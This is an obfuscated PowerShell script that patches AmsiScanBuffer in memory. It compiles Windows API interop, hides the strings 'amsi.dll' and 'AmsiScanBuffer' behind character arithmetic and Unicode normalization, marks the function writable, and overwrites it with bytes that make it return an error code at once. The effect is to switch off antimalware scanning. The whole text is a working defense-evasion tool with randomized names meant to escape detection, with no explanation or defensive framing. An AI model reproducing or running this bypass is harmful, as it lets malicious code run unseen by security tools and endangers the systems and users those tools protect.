$tvtqS9WTQcn = @"
using System;
using System.Runtime.InteropServices;
public class tvtqS9WTQcn {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hNBc9, string FvsGfZaAR_ZMh7O);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr fMjlULgJkZSGQRKGeNiJ, UIntPtr KvKEUmvfUuFZa, uint AC5dA90, out uint VwfJ);
}
"@

Add-Type $tvtqS9WTQcn

$FKMkqRkakX = [tvtqS9WTQcn]::LoadLibrary("$(('äm'+'sî'+'.d'+'ll').NorMalIZE([CHaR]([byTe]0x46)+[ChAR]([ByTe]0x6f)+[ChaR]([byTE]0x72)+[Char](14+95)+[char](62+6)) -replace [chAR]([BYte]0x5c)+[ChaR](112*67/67)+[CHar]([BytE]0x7b)+[cHaR](77*54/54)+[ChaR](67+43)+[CHAr]([byTE]0x7d))")
$kNtmZurZTo_0C5GHty = [tvtqS9WTQcn]::GetProcAddress($FKMkqRkakX, "$(('ÄmsîScä'+'nBûffér').NoRmaLizE([chAR]([ByTe]0x46)+[ChaR](111*15/15)+[ChAr]([Byte]0x72)+[ChAr]([byte]0x6d)+[chAr]([bYTE]0x44)) -replace [cHaR]([byte]0x5c)+[ChaR](112*14/14)+[CHAR]([BYTe]0x7b)+[CHar](53+24)+[ChAr]([ByTE]0x6e)+[cHAr](125))")
$p = 0
[tvtqS9WTQcn]::VirtualProtect($kNtmZurZTo_0C5GHty, [uint32]5, 0x40, [ref]$p)
$N00Z0PoAqsC = "0xB8"
$WV6fSa = "0x57"
$IwowHW = "0x00"
$g3WWE9xsw8MilROHCH = "0x07"
$zF_W0TGeiLl = "0x80"
$Bd1d0SukJPmzy5 = "0xC3"
$Pp5z_WXWyhTPPMAJ_4p = [Byte[]] ($N00Z0PoAqsC,$WV6fSa,$IwowHW,$g3WWE9xsw8MilROHCH,+$zF_W0TGeiLl,+$Bd1d0SukJPmzy5)
[System.Runtime.InteropServices.Marshal]::Copy($Pp5z_WXWyhTPPMAJ_4p, 0, $kNtmZurZTo_0C5GHty, 6)